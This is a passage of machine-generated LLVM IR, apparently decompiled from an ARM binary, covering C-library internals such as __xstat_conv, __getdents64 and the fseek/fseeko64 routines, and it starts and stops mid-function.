  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_17cb0 = inttoptr i32 %arg2 to i8*
  %v3_17cb0 = call i32 @__GI_memset(i8* %v2_17cb0, i32 0)
  %v1_17cb4 = add i32 %tmp, 4
  %v2_17cb4 = inttoptr i32 %v1_17cb4 to i32*
  %v3_17cb4 = load i32, i32* %v2_17cb4, align 4
  %v2_17cb8 = load i32, i32* %arg1, align 4
  store i32 %v2_17cb8, i32* %r8.global-to-local, align 4
  %v1_17cbc = load i32, i32* %r5.global-to-local, align 4
  %v2_17cbc = add i32 %v1_17cbc, 12
  %v3_17cbc = inttoptr i32 %v2_17cbc to i32*
  store i32 %v3_17cb4, i32* %v3_17cbc, align 4
  %v0_17cc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_17cc0 = add i32 %v0_17cc0, 20
  %v2_17cc0 = inttoptr i32 %v1_17cc0 to i32*
  %v3_17cc0 = load i32, i32* %v2_17cc0, align 4
  %v1_17cc4 = add i32 %v0_17cc0, 16
  %v2_17cc4 = inttoptr i32 %v1_17cc4 to i32*
  %v3_17cc4 = load i32, i32* %v2_17cc4, align 4
  store i32 %v3_17cc4, i32* %r6.global-to-local, align 4
  %v1_17cc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17cc8 = add i32 %v1_17cc8, 44
  %v3_17cc8 = inttoptr i32 %v2_17cc8 to i32*
  store i32 %v3_17cc0, i32* %v3_17cc8, align 4
  %v0_17ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_17ccc = add i32 %v0_17ccc, 24
  %v2_17ccc = inttoptr i32 %v1_17ccc to i32*
  %v3_17ccc = load i32, i32* %v2_17ccc, align 4
  %v1_17cd0 = load i32, i32* %r5.global-to-local, align 4
  %v2_17cd0 = add i32 %v1_17cd0, 48
  %v3_17cd0 = inttoptr i32 %v2_17cd0 to i32*
  store i32 %v3_17ccc, i32* %v3_17cd0, align 4
  %v0_17cd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_17cd4 = add i32 %v0_17cd4, 28
  %v2_17cd4 = inttoptr i32 %v1_17cd4 to i32*
  %v3_17cd4 = load i32, i32* %v2_17cd4, align 4
  %v1_17cd8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17cd8 = add i32 %v1_17cd8, 52
  %v3_17cd8 = inttoptr i32 %v2_17cd8 to i32*
  store i32 %v3_17cd4, i32* %v3_17cd8, align 4
  %v0_17cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_17cdc = add i32 %v0_17cdc, 32
  %v1_17ce0 = inttoptr i32 %v1_17cdc to i32*
  %v2_17ce0 = load i32, i32* %v1_17ce0, align 4
  %v3_17ce0 = add i32 %v0_17cdc, 36
  %v4_17ce0 = inttoptr i32 %v3_17ce0 to i32*
  %v5_17ce0 = load i32, i32* %v4_17ce0, align 4
  store i32 %v5_17ce0, i32* %r1.global-to-local, align 4
  %v0_17ce4 = load i32, i32* %r5.global-to-local, align 4
  %v1_17ce4 = add i32 %v0_17ce4, 56
  %v1_17ce8 = inttoptr i32 %v1_17ce4 to i32*
  store i32 %v2_17ce0, i32* %v1_17ce8, align 4
  %v3_17ce8 = add i32 %v0_17ce4, 60
  %v4_17ce8 = inttoptr i32 %v3_17ce8 to i32*
  %v5_17ce8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17ce8, i32* %v4_17ce8, align 4
  %v0_17cec = load i32, i32* %r4.global-to-local, align 4
  %v1_17cec = add i32 %v0_17cec, 40
  %v1_17cf0 = inttoptr i32 %v1_17cec to i32*
  %v2_17cf0 = load i32, i32* %v1_17cf0, align 4
  %v3_17cf0 = add i32 %v0_17cec, 44
  %v4_17cf0 = inttoptr i32 %v3_17cf0 to i32*
  %v5_17cf0 = load i32, i32* %v4_17cf0, align 4
  store i32 %v5_17cf0, i32* %r1.global-to-local, align 4
  %v0_17cf4 = load i32, i32* %r5.global-to-local, align 4
  %v1_17cf4 = add i32 %v0_17cf4, 64
  %v1_17cf8 = inttoptr i32 %v1_17cf4 to i32*
  store i32 %v2_17cf0, i32* %v1_17cf8, align 4
  %v3_17cf8 = add i32 %v0_17cf4, 68
  %v4_17cf8 = inttoptr i32 %v3_17cf8 to i32*
  %v5_17cf8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17cf8, i32* %v4_17cf8, align 4
  %v0_17cfc = load i32, i32* %r4.global-to-local, align 4
  %v1_17cfc = add i32 %v0_17cfc, 48
  %v1_17d00 = inttoptr i32 %v1_17cfc to i32*
  %v2_17d00 = load i32, i32* %v1_17d00, align 4
  %v3_17d00 = add i32 %v0_17cfc, 52
  %v4_17d00 = inttoptr i32 %v3_17d00 to i32*
  %v5_17d00 = load i32, i32* %v4_17d00, align 4
  store i32 %v5_17d00, i32* %r1.global-to-local, align 4
  %v1_17d04 = add i32 %v0_17cfc, 8
  %v2_17d04 = inttoptr i32 %v1_17d04 to i16*
  %v3_17d04 = load i16, i16* %v2_17d04, align 2
  %v4_17d04 = zext i16 %v3_17d04 to i32
  store i32 %v4_17d04, i32* %r2.global-to-local, align 4
  %v1_17d08 = add i32 %v0_17cfc, 10
  %v2_17d08 = inttoptr i32 %v1_17d08 to i16*
  %v3_17d08 = load i16, i16* %v2_17d08, align 2
  %v4_17d08 = zext i16 %v3_17d08 to i32
  store i32 %v4_17d08, i32* %ip.global-to-local, align 4
  %v1_17d0c = add i32 %v0_17cfc, 12
  %v2_17d0c = inttoptr i32 %v1_17d0c to i16*
  %v3_17d0c = load i16, i16* %v2_17d0c, align 2
  %v4_17d0c = zext i16 %v3_17d0c to i32
  store i32 %v4_17d0c, i32* %lr.global-to-local, align 4
  %v1_17d10 = add i32 %v0_17cfc, 14
  %v2_17d10 = inttoptr i32 %v1_17d10 to i16*
  %v3_17d10 = load i16, i16* %v2_17d10, align 2
  %v4_17d10 = zext i16 %v3_17d10 to i32
  store i32 %v4_17d10, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_17d1c = load i32, i32* %r5.global-to-local, align 4
  %v1_17d1c = add i32 %v0_17d1c, 72
  %v1_17d20 = inttoptr i32 %v1_17d1c to i32*
  store i32 %v2_17d00, i32* %v1_17d20, align 4
  %v3_17d20 = add i32 %v0_17d1c, 76
  %v4_17d20 = inttoptr i32 %v3_17d20 to i32*
  %v5_17d20 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17d20, i32* %v4_17d20, align 4
  %v0_17d24 = load i32, i32* %r5.global-to-local, align 4
  %v1_17d24 = inttoptr i32 %v0_17d24 to i32*
  %v2_17d24 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_17d24, i32* %v1_17d24, align 4
  %v3_17d24 = add i32 %v0_17d24, 4
  %v4_17d24 = inttoptr i32 %v3_17d24 to i32*
  %v5_17d24 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_17d24, i32* %v4_17d24, align 4
  %v0_17d28 = load i32, i32* %r6.global-to-local, align 4
  %v1_17d28 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d28 = add i32 %v1_17d28, 32
  %v3_17d28 = inttoptr i32 %v2_17d28 to i32*
  store i32 %v0_17d28, i32* %v3_17d28, align 4
  %v0_17d2c = load i32, i32* %r7.global-to-local, align 4
  %v1_17d2c = load i32, i32* %r5.global-to-local, align 4
  %v2_17d2c = add i32 %v1_17d2c, 36
  %v3_17d2c = inttoptr i32 %v2_17d2c to i32*
  store i32 %v0_17d2c, i32* %v3_17d2c, align 4
  %v0_17d30 = load i32, i32* %r2.global-to-local, align 4
  %v1_17d30 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d30 = add i32 %v1_17d30, 16
  %v3_17d30 = inttoptr i32 %v2_17d30 to i32*
  store i32 %v0_17d30, i32* %v3_17d30, align 4
  %v0_17d34 = load i32, i32* %ip.global-to-local, align 4
  %v1_17d34 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d34 = add i32 %v1_17d34, 20
  %v3_17d34 = inttoptr i32 %v2_17d34 to i32*
  store i32 %v0_17d34, i32* %v3_17d34, align 4
  %v0_17d38 = load i32, i32* %lr.global-to-local, align 4
  %v1_17d38 = load i32, i32* %r5.global-to-local, align 4
  %v2_17d38 = add i32 %v1_17d38, 24
  %v3_17d38 = inttoptr i32 %v2_17d38 to i32*
  store i32 %v0_17d38, i32* %v3_17d38, align 4
  %v0_17d3c = load i32, i32* %r4.global-to-local, align 4
  %v1_17d3c = load i32, i32* %r5.global-to-local, align 4
  %v2_17d3c = add i32 %v1_17d3c, 28
  %v3_17d3c = inttoptr i32 %v2_17d3c to i32*
  store i32 %v0_17d3c, i32* %v3_17d3c, align 4
  ret i32 %v2_17d00

; uselistorder directives
  uselistorder i32 %v0_17cfc, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 72, { 10, 4, 5, 6, 7, 0, 11, 1, 2, 3, 8, 9 }
  uselistorder i32 68, { 0, 1, 4, 2, 3 }
  uselistorder i32 60, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_17d50 = load i32, i32* @r4, align 4
  %v6_17d50 = load i32, i32* @r5, align 4
  %v12_17d50 = load i32, i32* @r7, align 4
  %v1_17d54 = add i32 %arg3, 14
  %v2_17d5c = ptrtoint i32* %stack_var_-72 to i32
  %v1_17d60 = and i32 %v1_17d54, -8
  %v2_17d64 = sub i32 %v2_17d5c, %v1_17d60
  %v1_17d68 = add i32 %v2_17d64, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_17d68, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_17da4, label %dec_label_pc_17d90

dec_label_pc_17d90:                               ; preds = %entry
  %v0_17d90 = call i32 @__GI___errno_location()
  %v0_17d94 = load i32, i32* %r4.global-to-local, align 4
  %v1_17d94 = sub i32 0, %v0_17d94
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17d9c = inttoptr i32 %v0_17d90 to i32*
  store i32 %v1_17d94, i32* %v2_17d9c, align 4
  %v0_17dac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17dac

dec_label_pc_17da4:                               ; preds = %entry
  br i1 false, label %dec_label_pc_17dac, label %dec_label_pc_17db4

dec_label_pc_17dac:                               ; preds = %dec_label_pc_17da4, %dec_label_pc_17d90
  %v0_17dac = phi i32 [ -1, %dec_label_pc_17da4 ], [ %v0_17dac.pre, %dec_label_pc_17d90 ]
  store i32 %v0_17dac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17e80

dec_label_pc_17db4:                               ; preds = %dec_label_pc_17da4
  %v2_17db4 = add i32 %v1_17d68, %arg1
  %v2_17db8 = add i32 %tmp, %arg3
  store i32 %v2_17db8, i32* @ip, align 4
  store i32 %v1_17d68, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17e68

dec_label_pc_17dd4:                               ; preds = %dec_label_pc_17e68
  %v1_17dd4 = add i32 %v0_17e28, 16
  %v2_17dd4 = inttoptr i32 %v1_17dd4 to i16*
  %v3_17dd4 = load i16, i16* %v2_17dd4, align 2
  %v4_17dd4 = zext i16 %v3_17dd4 to i32
  %v1_17dd8 = add nuw nsw i32 %v4_17dd4, 7
  %v1_17ddc = and i32 %v1_17dd8, 131064
  store i32 %v1_17ddc, i32* %r2.global-to-local, align 4
  %v2_17de4 = add i32 %v1_17ddc, %v0_17e30
  store i32 %v2_17de4, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_17de4, %v2_17db8
  br i1 %tmp26, label %dec_label_pc_17df0, label %dec_label_pc_17e24

dec_label_pc_17df0:                               ; preds = %dec_label_pc_17dd4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17df8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17df8, i32* %r2.global-to-local, align 4
  %v0_17dfc = load i32, i32* %sl.global-to-local, align 4
  %v1_17e00 = load i32, i32* @sp, align 4
  %v2_17e00 = inttoptr i32 %v1_17e00 to i32*
  store i32 0, i32* %v2_17e00, align 4
  %v4_17e04 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_17df8, i32 %v0_17dfc)
  %v0_17e08 = load i32, i32* @r5, align 4
  %v1_17e08 = load i32, i32* %r6.global-to-local, align 4
  %v9_17e08 = icmp eq i32 %v0_17e08, %v1_17e08
  br i1 %v9_17e08, label %dec_label_pc_17e10, label %dec_label_pc_17e7c

dec_label_pc_17e10:                               ; preds = %dec_label_pc_17df0
  %v0_17e10 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_17e1c = inttoptr i32 %v0_17e10 to i32*
  store i32 22, i32* %v2_17e1c, align 4
  %v0_17e80.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17e80

dec_label_pc_17e24:                               ; preds = %dec_label_pc_17dd4
  %v1_17e24 = inttoptr i32 %v0_17e28 to i32*
  %v2_17e24 = load i32, i32* %v1_17e24, align 4
  %v3_17e24 = add i32 %v0_17e28, 4
  %v4_17e24 = inttoptr i32 %v3_17e24 to i32*
  %v5_17e24 = load i32, i32* %v4_17e24, align 4
  store i32 %v5_17e24, i32* %r4.global-to-local, align 4
  %v1_17e28 = add i32 %v0_17e28, 8
  store i32 %v1_17e28, i32* %sb.global-to-local, align 4
  %v1_17e2c = inttoptr i32 %v1_17e28 to i32*
  %v2_17e2c = load i32, i32* %v1_17e2c, align 4
  store i32 %v2_17e2c, i32* %sb.global-to-local, align 4
  %v3_17e2c = add i32 %v0_17e28, 12
  %v4_17e2c = inttoptr i32 %v3_17e2c to i32*
  %v5_17e2c = load i32, i32* %v4_17e2c, align 4
  store i32 %v5_17e2c, i32* %sl.global-to-local, align 4
  %v1_17e30 = inttoptr i32 %v0_17e30 to i32*
  store i32 %v2_17e24, i32* %v1_17e30, align 4
  %v3_17e30 = add i32 %v0_17e30, 4
  %v4_17e30 = inttoptr i32 %v3_17e30 to i32*
  %v5_17e30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17e30, i32* %v4_17e30, align 4
  %v0_17e34 = load i32, i32* @r7, align 4
  %v1_17e34 = add i32 %v0_17e34, 8
  %v1_17e38 = inttoptr i32 %v1_17e34 to i32*
  %v2_17e38 = load i32, i32* %v1_17e38, align 4
  %v3_17e38 = add i32 %v0_17e34, 12
  %v4_17e38 = inttoptr i32 %v3_17e38 to i32*
  %v5_17e38 = load i32, i32* %v4_17e38, align 4
  store i32 %v5_17e38, i32* @r4, align 4
  %v1_17e3c = load i32, i32* @r5, align 4
  %v2_17e3c = add i32 %v1_17e3c, 8
  %v3_17e3c = inttoptr i32 %v2_17e3c to i32*
  store i32 %v2_17e38, i32* %v3_17e3c, align 4
  %v0_17e40 = load i32, i32* @r4, align 4
  %v1_17e40 = load i32, i32* @r5, align 4
  %v2_17e40 = add i32 %v1_17e40, 12
  %v3_17e40 = inttoptr i32 %v2_17e40 to i32*
  store i32 %v0_17e40, i32* %v3_17e40, align 4
  %v0_17e44 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e44 = trunc i32 %v0_17e44 to i16
  %v2_17e44 = load i32, i32* @r5, align 4
  %v3_17e44 = add i32 %v2_17e44, 16
  %v4_17e44 = inttoptr i32 %v3_17e44 to i16*
  store i16 %v1_17e44, i16* %v4_17e44, align 2
  %v0_17e48 = load i32, i32* @r7, align 4
  %v1_17e48 = add i32 %v0_17e48, 18
  %v2_17e48 = inttoptr i32 %v1_17e48 to i8*
  %v3_17e48 = load i8, i8* %v2_17e48, align 1
  %v4_17e48 = zext i8 %v3_17e48 to i32
  store i32 %v4_17e48, i32* @r3, align 4
  %v2_17e4c = load i32, i32* @r5, align 4
  %v3_17e4c = add i32 %v2_17e4c, 18
  %v4_17e4c = inttoptr i32 %v3_17e4c to i8*
  store i8 %v3_17e48, i8* %v4_17e4c, align 1
  %v0_17e50 = load i32, i32* @r7, align 4
  %v1_17e50 = add i32 %v0_17e50, 16
  %v2_17e50 = inttoptr i32 %v1_17e50 to i16*
  %v3_17e50 = load i16, i16* %v2_17e50, align 2
  %v4_17e50 = zext i16 %v3_17e50 to i32
  %v1_17e54 = add nsw i32 %v4_17e50, -19
  store i32 %v1_17e54, i32* @r2, align 4
  %v0_17e58 = call i32 @memcpy()
  %v0_17e5c = load i32, i32* @r7, align 4
  %v1_17e5c = add i32 %v0_17e5c, 16
  %v2_17e5c = inttoptr i32 %v1_17e5c to i16*
  %v3_17e5c = load i16, i16* %v2_17e5c, align 2
  %v4_17e5c = zext i16 %v3_17e5c to i32
  %v0_17e60 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_17e60, i32* @r5, align 4
  %v2_17e64 = add i32 %v4_17e5c, %v0_17e5c
  store i32 %v2_17e64, i32* @r7, align 4
  br label %dec_label_pc_17e68

dec_label_pc_17e68:                               ; preds = %dec_label_pc_17db4, %dec_label_pc_17e24
  %v0_17e30 = phi i32 [ %tmp, %dec_label_pc_17db4 ], [ %v0_17e60, %dec_label_pc_17e24 ]
  %v0_17e28 = phi i32 [ %v1_17d68, %dec_label_pc_17db4 ], [ %v2_17e64, %dec_label_pc_17e24 ]
  %v3_17e6c = icmp ult i32 %v0_17e28, %v2_17db4
  %v1_17e70 = add i32 %v0_17e30, 19
  store i32 %v1_17e70, i32* @r0, align 4
  %v1_17e74 = add i32 %v0_17e28, 19
  store i32 %v1_17e74, i32* @r1, align 4
  br i1 %v3_17e6c, label %dec_label_pc_17dd4, label %dec_label_pc_17e7c.loopexit

dec_label_pc_17e7c.loopexit:                      ; preds = %dec_label_pc_17e68
  %v0_17e7c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17e7c

dec_label_pc_17e7c:                               ; preds = %dec_label_pc_17e7c.loopexit, %dec_label_pc_17df0
  %v1_17e7c = phi i32 [ %v0_17e30, %dec_label_pc_17e7c.loopexit ], [ %v0_17e08, %dec_label_pc_17df0 ]
  %v0_17e7c = phi i32 [ %v0_17e7c.pre, %dec_label_pc_17e7c.loopexit ], [ %v1_17e08, %dec_label_pc_17df0 ]
  %v2_17e7c = sub i32 %v1_17e7c, %v0_17e7c
  store i32 %v2_17e7c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17e80

dec_label_pc_17e80:                               ; preds = %dec_label_pc_17e10, %dec_label_pc_17dac, %dec_label_pc_17e7c
  %v0_17e80 = phi i32 [ %v0_17e80.pre, %dec_label_pc_17e10 ], [ %v0_17dac, %dec_label_pc_17dac ], [ %v2_17e7c, %dec_label_pc_17e7c ]
  store i32 %v3_17d50, i32* %r4.global-to-local, align 4
  store i32 %v6_17d50, i32* @r5, align 4
  store i32 %v12_17d50, i32* @r7, align 4
  ret i32 %v0_17e80

; uselistorder directives
  uselistorder i32 %v0_17e28, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_17e30, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_17d68, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 3 }
  uselistorder i32 18, { 2, 3, 4, 0, 1 }
  uselistorder i32* @sp, { 8, 17, 19, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 6, 18, 7 }
  uselistorder i32 14, { 4, 9, 10, 5, 8, 6, 1, 2, 3, 7, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17e80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17e68, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_17e9c = load i32, i32* @r1, align 4
  store i32 %v0_17e9c, i32* @r2, align 4
  %v0_17ea4 = call i32 @__GI_fseeko64()
  ret i32 %v0_17ea4
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_17eb4 = load i32, i32* @r4, align 4
  %v6_17eb4 = load i32, i32* @r5, align 4
  %v12_17eb4 = load i32, i32* @r7, align 4
  store i32 %tmp16, i32* @r7, align 4
  %v0_17ec8 = load i32, i32* @r2, align 4
  store i32 %v0_17ec8, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r6.global-to-local, align 4
  %v0_17ed4 = load i32, i32* @r0, align 4
  store i32 %v0_17ed4, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp16, 3
  br i1 %tmp, label %dec_label_pc_17ef0, label %dec_label_pc_17edc

dec_label_pc_17edc:                               ; preds = %entry
  %v0_17edc = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17ee8 = inttoptr i32 %v0_17edc to i32*
  store i32 22, i32* %v2_17ee8, align 4
  br label %dec_label_pc_17fe0

dec_label_pc_17ef0:                               ; preds = %entry
  %v1_17ef0 = add i32 %v0_17ed4, 52
  %v2_17ef0 = inttoptr i32 %v1_17ef0 to i32*
  %v3_17ef0 = load i32, i32* %v2_17ef0, align 4
  %v1_17ef4 = sub i32 1, %v3_17ef0
  store i32 %v1_17ef4, i32* %r8.global-to-local, align 4
  %v2_17ef4 = icmp ult i32 %v3_17ef0, 2
  br i1 %v2_17ef4, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_17ef0
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17f3c

bb:                                               ; preds = %dec_label_pc_17ef0
  %v2_17efc = icmp eq i32 %v1_17ef4, 0
  br i1 %v2_17efc, label %dec_label_pc_17f3c, label %dec_label_pc_17f04

dec_label_pc_17f04:                               ; preds = %bb
  %v1_17f08 = add i32 %v0_17ed4, 56
  store i32 %v1_17f08, i32* @r4, align 4
  %v4_17f0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 36) to i32*), align 4
  store i32 %v4_17f0c, i32* %r1.global-to-local, align 4
  store i32 %v1_17f08, i32* %r2.global-to-local, align 4
  %v4_17f1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17f1c)
  %v0_17f30 = load i32, i32* %r6.global-to-local, align 4
  %v2_17f30 = add i32 %v0_17f30, 16
  %v3_17f30 = inttoptr i32 %v2_17f30 to i32*
  %v4_17f30 = load i32, i32* %v3_17f30, align 4
  store i32 %v4_17f30, i32* @ip, align 4
  store i32 98108, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17f30)
  %v0_17f3c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17f3c

dec_label_pc_17f3c:                               ; preds = %.thread, %bb, %dec_label_pc_17f04
  %v0_17f48 = phi i32 [ %v0_17ed4, %.thread ], [ %v0_17ed4, %bb ], [ %v0_17f3c.pre, %dec_label_pc_17f04 ]
  %v1_17f3c = inttoptr i32 %v0_17f48 to i16*
  %v2_17f3c = load i16, i16* %v1_17f3c, align 2
  %v1_17f40 = and i16 %v2_17f3c, 64
  %v2_17f40 = icmp eq i16 %v1_17f40, 0
  br i1 %v2_17f40, label %dec_label_pc_17f58, label %dec_label_pc_17f48

dec_label_pc_17f48:                               ; preds = %dec_label_pc_17f3c
  store i32 %v0_17f48, i32* @r0, align 4
  %v0_17f4c = call i32 @__stdio_wcommit()
  %v2_17f50 = icmp eq i32 %v0_17f4c, 0
  br i1 %v2_17f50, label %dec_label_pc_17f58, label %dec_label_pc_17fc0

dec_label_pc_17f58:                               ; preds = %dec_label_pc_17f48, %dec_label_pc_17f3c
  %v0_17f58 = load i32, i32* @r7, align 4
  %v7_17f58 = icmp eq i32 %v0_17f58, 1
  br i1 %v7_17f58, label %dec_label_pc_17f60, label %dec_label_pc_17f58.dec_label_pc_17f74_crit_edge

dec_label_pc_17f58.dec_label_pc_17f74_crit_edge:  ; preds = %dec_label_pc_17f58
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_17f74

dec_label_pc_17f60:                               ; preds = %dec_label_pc_17f58
  %v0_17f60 = load i32, i32* @r5, align 4
  %v2_17f64 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_17f64, i32* %r1.global-to-local, align 4
  %v2_17f68 = inttoptr i32 %v0_17f60 to i16*
  %v3_17f68 = call i32 @__stdio_adjust_position(i16* %v2_17f68, i32 %v2_17f64)
  %v1_17f6c = icmp slt i32 %v3_17f68, 0
  br i1 %v1_17f6c, label %dec_label_pc_17fc0, label %dec_label_pc_17f60.dec_label_pc_17f74_crit_edge

dec_label_pc_17f60.dec_label_pc_17f74_crit_edge:  ; preds = %dec_label_pc_17f60
  %v0_17f74.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17f74

dec_label_pc_17f74:                               ; preds = %dec_label_pc_17f58.dec_label_pc_17f74_crit_edge, %dec_label_pc_17f60.dec_label_pc_17f74_crit_edge
  %v2_17f7c.pre-phi = phi i32 [ %.pre, %dec_label_pc_17f58.dec_label_pc_17f74_crit_edge ], [ %v2_17f64, %dec_label_pc_17f60.dec_label_pc_17f74_crit_edge ]
  %v0_17f74 = phi i32 [ %v0_17f58, %dec_label_pc_17f58.dec_label_pc_17f74_crit_edge ], [ %v0_17f74.pre, %dec_label_pc_17f60.dec_label_pc_17f74_crit_edge ]
  store i32 %v0_17f74, i32* %r2.global-to-local, align 4
  %v0_17f78 = load i32, i32* @r5, align 4
  store i32 %v2_17f7c.pre-phi, i32* %r1.global-to-local, align 4
  %v4_17f80 = call i32 @__stdio_seek(i32 %v0_17f78, i32* nonnull %stack_var_-32, i32 %v0_17f74)
  %v1_17f84 = icmp slt i32 %v4_17f80, 0
  br i1 %v1_17f84, label %dec_label_pc_17fc0, label %dec_label_pc_17f8c

dec_label_pc_17f8c:                               ; preds = %dec_label_pc_17f74
  %v0_17f8c = load i32, i32* @r5, align 4
  %v1_17f8c = inttoptr i32 %v0_17f8c to i16*
  %v2_17f8c = load i16, i16* %v1_17f8c, align 2
  %v1_17f90 = add i32 %v0_17f8c, 8
  %v2_17f90 = inttoptr i32 %v1_17f90 to i32*
  %v3_17f90 = load i32, i32* %v2_17f90, align 4
  store i32 %v3_17f90, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_17f98 = and i16 %v2_17f8c, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_17f98, i16* %v1_17f8c, align 2
  %v0_17fa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fa4 = load i32, i32* @r5, align 4
  %v2_17fa4 = add i32 %v1_17fa4, 28
  %v3_17fa4 = inttoptr i32 %v2_17fa4 to i32*
  store i32 %v0_17fa4, i32* %v3_17fa4, align 4
  %v0_17fa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17fa8 = trunc i32 %v0_17fa8 to i8
  %v2_17fa8 = load i32, i32* @r5, align 4
  %v3_17fa8 = add i32 %v2_17fa8, 2
  %v4_17fa8 = inttoptr i32 %v3_17fa8 to i8*
  store i8 %v1_17fa8, i8* %v4_17fa8, align 1
  %v0_17fac = load i32, i32* %r2.global-to-local, align 4
  %v1_17fac = load i32, i32* @r5, align 4
  %v2_17fac = add i32 %v1_17fac, 16
  %v3_17fac = inttoptr i32 %v2_17fac to i32*
  store i32 %v0_17fac, i32* %v3_17fac, align 4
  %v0_17fb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fb0 = load i32, i32* @r5, align 4
  %v2_17fb0 = add i32 %v1_17fb0, 20
